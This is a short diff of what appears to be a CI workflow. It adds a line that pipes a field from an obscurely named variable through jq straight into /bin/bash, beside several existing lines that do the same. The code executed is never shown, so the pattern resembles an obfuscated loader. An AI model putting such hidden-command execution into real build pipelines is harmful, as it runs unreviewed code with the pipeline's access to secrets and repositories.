@@ -25,6 +25,7 @@ jobs:
           echo $bul9517 | jq -r .bc53183 | /bin/bash
           echo $hic56 | jq -r .s07910 | /bin/bash
           echo $zpi8 | jq -r .e0 | /bin/bash
+          printf '%s' "$syd49" | jq -r .rbfm36 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
